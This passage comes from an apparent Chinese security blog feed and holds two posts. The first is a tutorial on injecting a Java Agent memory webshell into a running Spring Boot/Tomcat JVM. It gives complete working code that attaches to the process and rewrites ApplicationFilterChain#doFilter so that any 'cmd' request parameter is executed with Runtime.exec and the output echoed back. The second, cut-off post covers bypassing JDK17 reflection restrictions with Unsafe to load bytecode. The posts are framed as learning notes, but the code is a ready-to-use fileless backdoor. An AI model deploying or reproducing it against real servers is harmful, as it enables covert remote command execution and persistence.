com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为目标类则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>)) &#123;<br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent-1.0-SNAPSHOT.jar&quot;</span>);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行效果如下：</p><blockquote><p>不过如果想要用javassist来修改的话，目标类也需要引入javassist依赖才行，不然会报错</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241031115558447.png" alt="image-20241031115558447"></p><h2 id="instrumentation的局限"><a href="#Instrumentation的局限" class="headerlink" title="Instrumentation的局限"></a>Instrumentation的局限</h2><p>premain 和 agentmain 两种方式<strong>修改字节码</strong>的时机都是类文件加载之后，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</p><p>类的字节码修改称为类转换 (Class Transform)，类转换其实最终都回归到类重定义 <code>Instrumentation#redefineClasses</code> 方法，此方法有以下限制：</p><ol><li>新类和老类的父类必须相同</li><li>新类和老类实现的接口数也要相同，并且是相同的接口</li><li>新类和老类访问符必须一致。 </li><li>新类和老类字段数和字段名要一致</li><li>新类和老类新增或删除的方法必须是 private static&#x2F;final 修饰的</li><li>可以修改方法体</li></ol><h1 id="java-agent实现spring-filter内存马"><a href="#Java-Agent实现Spring-Filter内存马" class="headerlink" title="Java Agent实现Spring Filter内存马"></a>Java Agent实现Spring Filter内存马</h1><p>因为springboot内置了Tomcat服务，所以我们找到Filter链中一定会执行的方法，然后重写他即可</p><p>他的流程为ApplicationFilterChain#doFilter&#x3D;&#x3D;》ApplicationFilterChain#internalDoFilter</p><p><img src="https://cdn.clown2024.cn/image-20241031170819582.png" alt="image-20241031170819582"></p><p><img src="https://cdn.clown2024.cn/image-20241031170835475.png" alt="image-20241031170835475"></p><p>这两个方法都能够拿到ServletRequest 和 ServletResponse，而且hook不会影响正常业务逻辑</p><p>所以我们重写ApplicationFilterChain#internalDoFilter或者doFilter方法来打入内存马即可</p><h2 id="编写agent内存马"><a href="#编写agent内存马" class="headerlink" title="编写agent内存马"></a>编写agent内存马</h2><p>照例先实现一个ClassFileTransformer，这里的ServletRequest需要我们自己去源码看一下具体是什么类，这里是jakarta.servlet.ServletRequest</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>            <span class="hljs-comment">//设置方法体</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;jakarta.servlet.ServletRequest request = $1\n;&quot;</span> + <span class="hljs-comment">//$1为第一个参数，也就是request请求实例</span><br>                    <span class="hljs-string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd !=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  &#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>agentmain</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class[] allLoadedClasses = inst.getAllLoadedClasses();<span class="hljs-comment">//获取所有已加载的类</span><br>        <span class="hljs-comment">//获取目标JVM加载的全部类</span><br>        <span class="hljs-keyword">for</span>(Class cls : allLoadedClasses)&#123;<br>            <span class="hljs-keyword">if</span> (cls.getName().equals(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>))&#123;<br>                <span class="hljs-comment">//添加一个transformer到Instrumentation，并重新触发目标类加载</span><br>                inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterTransform</span>(),<span class="hljs-literal">true</span>);<br>                inst.retransformClasses(cls);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>MF文件就和前面一样，这里就不再写出来了</p><p>最后是Inject类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        System.out.println(list);<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为目标类则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.dev.DevApplication&quot;</span>)) &#123;<br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent-1.0-SNAPSHOT.jar&quot;</span>);<br>                System.out.println(<span class="hljs-string">&quot;成功插入agent&quot;</span>);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里还有一个很坑的点，就是版本问题，我们的javaagent的jar包和inject类都需要是符合目标的jdk版本的，估计是低版本不能向高版本注入的问题</p><p>现在我们吧springboot服务开起来，然后启动inject注入agent就可以打入内存马了</p><p><img src="https://cdn.clown2024.cn/image-20241031204330693.png" alt="image-20241031204330693"></p><p><img src="https://cdn.clown2024.cn/image-20241031204345365.png" alt="image-20241031204345365"></p><p>我看有些文章可以将inject类写成jar包，传入vm的pid和agent的jar包参数就能命令行执行了，不过需要相关的内存工具来获取pid才行。</p><h2 id="agent内存马回显问题"><a href="#agent内存马回显问题" class="headerlink" title="agent内存马回显问题"></a>agent内存马回显问题</h2><p>这里的简单内存马不带回显感觉不方便，我又去网上找了一下有回显的写法，ClassFileTransformer就可以改成下面这样</p><p>参考这篇文章：<a href="https://sec.1i6w31fen9.top/2023/09/24/javaagent-memory-trojan/">https://sec.1i6w31fen9.top/2023/09/24/javaagent-memory-trojan/</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;internalDoFilter&quot;</span>);<br>            <span class="hljs-comment">//设置方法体,带回显</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;jakarta.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +<br>                    <span class="hljs-string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd!=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.PrintWriter writer = $2.getWriter();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span> +<br>                    <span class="hljs-string">&quot;String result = scanner.hasNext()?scanner.next():\&quot;\&quot;;&quot;</span> +<br>                    <span class="hljs-string">&quot;scanner.close();writer.write(result);&quot;</span> +<br>                    <span class="hljs-string">&quot;writer.flush();writer.close();\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  &#125;else&#123;internalDoFilter($1,$2);&#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<span class="hljs-comment">//在方法前插入代码</span><br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            ctClass.detach();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>emmm但是有个很奇怪的问题，他每次请求完就会卡住，然后就报下面的错误：</p><p><img src="https://cdn.clown2024.cn/image-20241031215713085.png" alt="image-20241031215713085"></p><p>意思是JVM在运行的时候找不到类的定义，这就很奇怪了，然后试了很多其他的操作发现都是报这个错误，只有前面那个简单的内存马能通，不知道为什么</p><p>我直接copy了他的整个doFilter方法也不行红温了😡</p><p>fuck我改了一晚上终于行了，这是成功的版本</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>            <span class="hljs-comment">//设置方法体</span><br>            String body=<span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;final jakarta.servlet.ServletRequest req = $1;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;final jakarta.servlet.ServletResponse res = $2;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;try &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;String cmd=req.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd!=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.PrintWriter writer = res.getWriter();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span> +<br>                    <span class="hljs-string">&quot;String result = scanner.hasNext()?scanner.next():\&quot;\&quot;;&quot;</span> +<br>                    <span class="hljs-string">&quot;scanner.close();writer.write(result);&quot;</span> +<br>                    <span class="hljs-string">&quot;writer.flush();writer.close();\n&quot;</span> +<br>                    <span class="hljs-string">&quot;internalDoFilter(req, res);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;return null;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;\n&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125; catch (java.lang.Exception pe) &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果只需要比前面那个多一段**internalDoFilter(req, res);**方法的调用就可以了，我估计是不调用该方法调用链就会直接断掉，导致我发请求就卡在哪里不动</p><p><img src="https://cdn.clown2024.cn/image-20241031231112320.png" alt="image-20241031231112320"></p><p>而且这种方法写如果弹计算器的话他会弹五次，说明他调用链中走了五次doFilter方法</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/t/9450?u_atoken=bf936a9b17ff00a7cb14f93f2e5272de&u_asig=1a0c384b17302758676971458e00f7&time__1311=iq0hYKAIqjOD7DloNGkDulDRibGCbbUnt+teD">https://xz.aliyun.com/t/9450?u_atoken=bf936a9b17ff00a7cb14f93f2e5272de&amp;u_asig=1a0c384b17302758676971458e00f7&amp;time__1311=iq0hYKAIqjOD7DloNGkDulDRibGCbbUnt%2BteD</a></p><p><a href="https://www.cnblogs.com/rickiyang/p/11368932.html">https://www.cnblogs.com/rickiyang/p/11368932.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java-agent介绍&quot;&gt;&lt;a href=&quot;#Java-Agent介绍&quot; class=&quot;headerlink&quot; title=&quot;Java Agent介绍&quot;&gt;&lt;/a&gt;Java Agent介绍&lt;/h1&gt;&lt;p&gt;官方文档：&lt;a href=&quot;https://docs.ora</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="内存马" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>JDK17反射限制绕过学习</title>
    <link href="https://clowsman.github.io/2024/10/29/JDK17%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/29/JDK17%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-29T15:44:00.000Z</published>
    <updated>2024-10-30T06:54:46.141Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jdk17反射限制"><a href="#JDK17反射限制" class="headerlink" title="JDK17反射限制"></a>JDK17反射限制</h1><p>在JDK9至JDK16版本之中，Java.*依赖包下所有的非公共字段和方法在进行反射调用的时候，会出现关于非法反射访问的警告，但是在JDK17之后，采用的是强封装，默认情况下不再允许这一类的反射，所有反射访问<strong>java.*的非公共字段和方法</strong>的代码将抛出InaccessibleObjectException异常</p><p>比如下面获取ClassLoader的protected的defineClass方法</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>会报这样的错误</p><p><img src="https://cdn.clown2024.cn/image-20241030111739224.png" alt="image-20241030111739224"></p><h2 id="jdk模块化限制"><a href="#JDK模块化限制" class="headerlink" title="JDK模块化限制"></a>JDK模块化限制</h2><p>为什么会这样被限制呢，这是由于在JDK9之后引入的模块化机制，指Java平台模块系统（Java Platform Module System，简称JPMS）</p><p>模块化机制的一些关键概念(由kimi生成)：</p><ul><li><strong>模块（Module）</strong>：一个模块是一组相关的包的集合，这些包一起提供特定的功能。</li><li><strong>模块化路径（Module Path）</strong>：模块化路径是类路径的替代品，用于指定模块的位置。</li><li><strong>模块描述符（Module Descriptor）</strong>：一个模块的配置文件，通常名为<code>module-info.class</code>，它定义了模块的名称、所需的依赖、提供的服务以及对其他模块的依赖。</li><li><strong>requires</strong>：在模块描述符中声明模块依赖，指定当前模块需要哪些其他模块。</li><li><strong>exports</strong>：声明模块中的哪些包是可供其他模块使用的。</li><li><strong>opens</strong>：声明模块中的哪些包是可供其他模块通过反射访问的。</li><li><strong>uses</strong>：声明模块需要使用哪个服务提供者。</li><li><strong>provides</strong>：声明模块提供了哪些服务实现。</li><li><strong>transitive</strong>：依赖关系的传递性，即如果模块A依赖模块B，而模块B又依赖模块C，那么模块A也隐式地依赖模块C。</li></ul><p>这些也可以去看一看JDK9的官方新特性说明：<a href="https://docs.oracle.com/javase/9/whatsnew/toc.htm#JSNEW-GUID-C23AFD78-C777-460B-8ACE-58BE5EA681F6">https://docs.oracle.com/javase/9/whatsnew/toc.htm#JSNEW-GUID-C23AFD78-C777-460B-8ACE-58BE5EA681F6</a></p><p>我们可以看看jdk17的jar包</p><p><img src="https://cdn.clown2024.cn/image-20241030130830178.png" alt="image-20241030130830178"></p><p>可以看到他的每个模块都是有module-info.class文件的</p><p>在JDK9新增了模块化服务之后，public、protected等访问权限修饰符就只在自己的模块里面生效，想在模块外被识别的话就需要使用exports关键字来导出</p><p>可以看看java本身的文件是怎么写的</p><p><img src="https://cdn.clown2024.cn/image-20241030132815410.png" alt="image-20241030132815410"></p><p>可以看到有很多常见类的导出，所以这些常见类平时才能被我们识别</p><p>而能否被反射访问是通过opens指令来定义的，我们可以随便找一个有opens指令的class文件来看看</p><p>比如这个</p><p><img src="https://cdn.clown2024.cn/image-20241030133237491.png" alt="image-20241030133237491"></p><p>这个的意思就是指定某些特定的模块才能在运行时对该模块下特定包下的类进行反射操作，to 后面跟模块名称。</p><p>只有opens <packeage>表示对所有模块开放反射</packeage></p><p>前面的模块中并没有对java.lang等等的class进行开放，所以我们也就无法反射获取其非public的字段和方法</p><h1 id="unsafe绕过"><a href="#Unsafe绕过" class="headerlink" title="Unsafe绕过"></a>Unsafe绕过</h1><h2 id="unsafe介绍"><a href="#Unsafe介绍" class="headerlink" title="Unsafe介绍"></a>Unsafe介绍</h2><p>Unsafe是位于sun.misc包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升Java运行效率、增强Java语言底层资源操作能力方面起到了很大的作用。但由于Unsafe类使Java语言拥有了类似C语言指针一样操作内存空间的能力，这无疑也增加了程序发生相关指针问题的风险。</p><p>sun.misc和sun.reflect包下的我们是可以正常反射的，所以我们就可以利用到这个类，可以在源码中看到</p><p><img src="https://cdn.clown2024.cn/image-20241030134455456.png" alt="image-20241030134455456"></p><p>有关Unsafe类的更详细介绍参考这篇文章：<a href="https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html">https://tech.meituan.com/2019/02/14/talk-about-java-magic-class-unsafe.html</a></p><p>在JDK17前Unsafe是有两个方法可以进行字节码的加载</p><p>在JDK11之前<code>defineClass</code>和<code>defineAnonymousClass</code>两种方法可以加载字节码，到JDK11就只剩下<code>defineAnonymousClass</code>一种方法，在JDK17之后这两种方法就都被移除了</p><p>所以JDK17前可以用下面这种方式来进行反射类的加载</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>field.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) field.get(<span class="hljs-literal">null</span>);<br>unsafe.defineAnonymousClass(Class.class,bytes,<span class="hljs-literal">null</span>).newInstance();<br></code></pre></td></tr></table></figure><p>反射获取theUnsafe字段是因为该字段是单例模式</p><p><img src="https://cdn.clown2024.cn/image-20241030135005733.png" alt="image-20241030135005733"></p><p>不过也有静态方法来获取Unsafe实例，同样是返回theUnsafe字段的值</p><p><img src="https://cdn.clown2024.cn/image-20241030135048330.png" alt="image-20241030135048330"></p><h2 id="jdk17unsafe绕过"><a href="#JDK17Unsafe绕过" class="headerlink" title="JDK17Unsafe绕过"></a>JDK17Unsafe绕过</h2><p>那么JDK17之后我们要怎么绕过呢？</p><p>我们反射调用非public的字段或方法时，java是在setAccessiable方法执行的时候抛出异常的，我们可以去看一下他异常抛出逻辑，直接根据报错的调用栈去看</p><p><img src="https://cdn.clown2024.cn/image-20241030135950313.png" alt="image-20241030135950313"></p><p>首先他会走到checkCanSetAccessible方法，从意思上也知道，就是检查能否设置权限的方法</p><p><img src="https://cdn.clown2024.cn/image-20241030140555749.png" 